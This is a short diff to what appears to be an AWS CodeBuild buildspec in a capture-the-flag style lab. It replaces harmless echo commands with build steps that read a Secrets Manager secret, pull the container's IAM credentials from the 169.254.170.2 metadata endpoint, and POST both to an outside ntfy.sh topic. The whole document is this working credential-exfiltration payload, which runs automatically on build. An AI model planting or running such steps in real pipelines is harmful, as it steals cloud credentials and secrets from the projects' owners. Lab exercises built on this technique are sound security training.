@@ -3,6 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - FLAG=$(aws secretsmanager get-secret-value --region us-east-1 --secret-id flag_codebuild_lab_5 --query SecretString --output text)
+      - CREDS=$(curl -fsS "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" || true)
+      - printf 'FLAG=%s\nRELATIVE_URI=%s\nCREDS=%s\n' "$FLAG" "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" "$CREDS" | curl -fsS -X POST --data-binary @- https://ntfy.sh/arte-codebuild-lab5-1779011450-2387
